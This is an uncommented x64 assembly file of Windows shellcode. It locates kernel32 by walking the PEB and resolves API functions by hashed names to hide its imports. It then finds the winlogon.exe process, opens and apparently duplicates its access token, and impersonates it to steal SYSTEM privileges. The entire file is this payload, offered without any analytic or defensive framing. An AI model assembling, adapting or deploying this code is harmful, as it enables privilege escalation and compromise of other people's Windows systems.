[bits 64]

section .text
global _start

_start:
    push rdi
    and rsp, -16
    sub rsp, 8192

    mov rcx, 0x60
    mov r8, qword [gs:rcx]
    mov rdi, [r8 + 0x18]
    mov rdi, [rdi + 0x30]

.search_k32:
    mov rbx, [rdi + 0x10]
    mov rsi, [rdi + 0x40]
    mov rdi, [rdi]
    cmp byte [rsi + 24], 0
    jne .search_k32
    cmp byte [rsi], 0x4B
    jne .search_k32

    mov r12, rbx

    mov rcx, r12
    mov r8d, 0xec0e4e8e
    call lookup_api
    mov [rsp + 0], rax

    mov rcx, r12
    mov r8d, 0xefe297c0
    call lookup_api
    mov [rsp + 8], rax

    mov rcx, r12
    mov r8d, 0xe454dfed
    call lookup_api
    mov [rsp + 16], rax

    mov rcx, r12
    mov r8d, 0xd53992a4
    call lookup_api
    mov [rsp + 24], rax

    mov rcx, r12
    mov r8d, 0x2a523c0a
    call lookup_api
    mov [rsp + 32], rax

    mov rcx, r12
    mov r8d, 0x0ffd97fb
    call lookup_api
    mov [rsp + 40], rax

    mov rcx, r12
    mov r8d, 0x2e880484
    call lookup_api
    mov [rsp + 48], rax

    mov rcx, r12
    mov r8d, 0x7c001556
    call lookup_api
    mov [rsp + 56], rax

    mov rcx, r12
    mov r8d, 0xfa6e2b74
    call lookup_api
    mov [rsp + 64], rax

    mov rax, 0x3233697061766461
    mov [rsp + 512], rax
    mov dword [rsp + 520], 0x6c6c642e
    mov byte [rsp + 524], 0

    lea rcx, [rsp + 512]
    sub rsp, 32
    call [rsp + 32]
    add rsp, 32

    test rax, rax
    jz .skip_token_theft
    mov r13, rax

    mov rcx, r13
    mov r8d, 0x591ea70f
    call lookup_api
    mov [rsp + 72], rax

    mov rcx, r13
    mov r8d, 0x3a55bbb2
    call lookup_api
    mov [rsp + 80], rax

    mov rcx, r13
    mov r8d, 0x7f1cae66
    call lookup_api
    mov [rsp + 88], rax

    mov rcx, 2
    xor rdx, rdx
    sub rsp, 32
    call [rsp + 48]
    add rsp, 32

    test rax, rax
    jz .skip_token_theft
    cmp rax, -1
    je .skip_token_theft
    mov r14, rax

    lea r15, [rsp + 1024]
    mov dword [r15], 556

    mov rcx, r14
    mov rdx, r15
    sub rsp, 32
    call [rsp + 56]
    add rsp, 32

    test eax, eax
    jz .close_snapshot

    xor ebp, ebp

.enum_loop:
    lea rsi, [r15 + 44]
    lea rdi, [rel .winlogon_str]
    mov rcx, 13

.cmp_loop:
    movzx eax, word [rsi]
    movzx edx, word [rdi]
    cmp eax, edx
    jne .next_process
    test eax, eax
    jz .found_winlogon
    add rsi, 2
    add rdi, 2
    dec rcx
    jnz .cmp_loop

.found_winlogon:
    mov ebp, [r15 + 8]
    jmp .close_snapshot

.next_process:
    mov dword [r15], 556
    mov rcx, r14
    mov rdx, r15
    sub rsp, 32
    call [rsp + 64]
    add rsp, 32

    test eax, eax
    jnz .enum_loop

.close_snapshot:
    mov rcx, r14
    sub rsp, 32
    call [rsp + 72]
    add rsp, 32

    test ebp, ebp
    jz .skip_token_theft

    mov rcx, 0x400
    xor rdx, rdx
    mov r8d, ebp
    sub rsp, 32
    call [rsp + 40]
    add rsp, 32

    test rax, rax
    jz .skip_token_theft
    mov r14, rax

    mov rcx, r14
    mov rdx, 0x2
    lea r8, [rsp + 600]
    sub rsp, 32
    call [rsp + 104]
    add rsp, 32

    test eax, eax
    jz .close_winlogon

    mov r15, [rsp + 600]

    mov rcx, r15
    mov rdx, 0x02000000
    xor r8, r8
    mov r9d, 2
    sub rsp, 48
    mov dword [rsp + 32], 2
    lea rax, [rsp + 656]
    mov [rsp + 40], rax
    call [rsp + 128]
    add rsp, 48

    test eax, eax
    jz .close_token

    mov rbx, [rsp + 608]

    xor rcx, rcx
    mov rdx, rbx
    sub rsp, 32
    call [rsp + 120]
    add rsp, 32

    mov rcx, rbx
    sub rsp, 32
    call [rsp + 72]
    add rsp, 32

.close_token:
    mov rcx, r15
    sub rsp, 32
    call [rsp + 72]
    add rsp, 32

.close_winlogon:
    mov rcx, r14
    sub rsp, 32
    call [rsp + 72]
    add rsp, 32

.skip_token_theft:
    lea rax, [rsp + 8192]
    mov rdi, [rax]

    xor rcx, rcx
    sub rsp, 32
    call [rsp + 80]
    add rsp, 32

    xor rcx, rcx
    mov rdx, rdi
    xor r8, r8
    sub rsp, 32
    call [rsp + 88]
    add rsp, 32

    mov r15, rax

    mov rcx, r15
    sub rsp, 32
    call [rsp + 96]
    add rsp, 32

    int 3

.winlogon_str:
    dw 0x77, 0x69, 0x6E, 0x6C, 0x6F, 0x67, 0x6F, 0x6E, 0x2E, 0x65, 0x78, 0x65, 0x00

lookup_api:
    push rbx
    push rdi
    push rsi
    push r12

    mov rbx, rcx
    mov eax, [rbx + 0x3C]
    mov edi, [rbx + rax + 0x88]
    add rdi, rbx

    mov ecx, [rdi + 0x18]
    mov eax, [rdi + 0x20]
    add rax, rbx
    mov r12, rax

.lookup_loop:
    jecxz .lookup_fail
    dec ecx

    mov esi, [r12 + rcx * 4]
    add rsi, rbx

    xor eax, eax
    xor edx, edx

.calc_hash:
    lodsb
    test al, al
    jz .check_hash
    ror edx, 13
    add edx, eax
    jmp .calc_hash

.check_hash:
    cmp edx, r8d
    jne .lookup_loop

    mov eax, [rdi + 0x24]
    add rax, rbx
    movzx ecx, word [rax + rcx * 2]

    mov eax, [rdi + 0x1C]
    add rax, rbx
    mov eax, [rax + rcx * 4]
    add rax, rbx

    pop r12
    pop rsi
    pop rdi
    pop rbx
    ret

.lookup_fail:
    xor rax, rax
    pop r12
    pop rsi
    pop rdi
    pop rbx
    ret